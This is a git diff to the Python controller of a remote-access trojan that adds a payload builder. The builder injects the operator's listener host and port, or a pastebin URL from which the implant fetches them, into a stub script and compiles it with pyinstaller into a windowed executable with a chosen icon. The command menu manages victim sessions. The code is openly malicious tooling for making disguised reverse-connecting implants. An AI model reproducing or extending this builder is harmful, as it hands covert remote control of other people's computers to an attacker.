@@ -1,5 +1,5 @@
 import socket
-
+import  requests
 import json
 import os
 import threading
@@ -55,18 +55,47 @@ def build():
         print('run installed.bat and restart the tool')
         exit()
     else:
-        lhost = input('entre your host:')
-        lport = input('entre lport:')
-        icon = ""
-        while isfile(icon) == False:
-            icon = input('entre your icon path:')
-        os.system('powershell -c cd stub; cp jarbou3.py ..')
-        replace_string('jarbou3.py', '$lhost', lhost)
-        replace_string('jarbou3.py', '$lport', lport)
-        print('[+]Compiling')
-        os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3.py"')
-        os.remove('jarbou3.py')
-        os.system('powershell -c cd dist; cp jarbou3.exe ..')
+        print("""
+1) lhost and lport
+2) grab host and port from pastebin ex:127.0.0.1:4444
+        """)
+        c = int(input('choose:'))
+        if c == 1:
+            lhost = input('entre your host:')
+            lport = input('entre lport:')
+            icon = ""
+            while isfile(icon) == False:
+                icon = input('entre your icon path:')
+            os.system('powershell -c cd stub; cp jarbou3.py ..')
+            replace_string('jarbou3.py', '$lhost', lhost)
+            replace_string('jarbou3.py', '$lport', lport)
+
+            print('[+]Compiling')
+            os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3.py"')
+            os.remove('jarbou3.py')
+            os.system('powershell -c cd dist; cp jarbou3.exe ..')
+        elif c == 2:
+            URL = input('entre you url:')
+            u = requests.get(URL).text
+            sp = u.split(':')
+            print('host is:'+sp[0]+'\n port is:'+sp[1])
+            os.system('powershell -c cd stub; cp jarbou3-pastebin.py ..')
+            ask = input('is  those your host and port(y/n):')
+            if ask == 'y':
+                replace_string('jarbou3-pastebin.py','$pastebin',URL)
+                icon = ''
+                while isfile(icon) == False:
+                    icon = input('entre your icon path:')
+                print('[+]Compiling')
+                os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3-pastebin.py"')
+
+                os.system('powershell -c cd dist; cp jarbou3-pastebin.exe ..')
+            else:
+                os.remove('jarbou3-pastebin.py')
+                build()
+        else:
+            build()
+
 
 
 def banner():
@@ -234,6 +263,7 @@ while True:
     kill            --> kill session
     rmlist          --> remove disconnected target from list
     clear           --> clear the screen
+    build           --> build payload
             """)
     elif command == 'banner':
         banner()
